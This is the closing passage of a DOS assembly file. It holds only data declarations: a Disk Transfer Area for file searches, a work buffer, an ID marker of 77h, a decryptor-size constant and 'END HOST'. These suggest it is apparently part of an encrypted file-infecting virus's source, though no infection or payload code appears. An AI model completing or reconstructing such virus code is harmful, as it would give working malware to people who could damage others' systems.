PATH_ADDRESS    dw  0
FILENAME_PTR    dw  0
WORK_AREA       db  64 DUP (0),'$'

DTA             db 21 dup(0)  ;reserved
DTA_File_Attr   db ?
DTA_File_Time   dw ?
DTA_File_Date   dw ?
DTA_File_Size   dd ?
DTA_File_Name   db 13 dup(0)

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

ID               equ 77h
DECRYPTOR_SIZE   equ 16d ; equ OFFSET WORK_BUFFER - OFFSET START_IMAGE

MAIN ENDS
     END    HOST
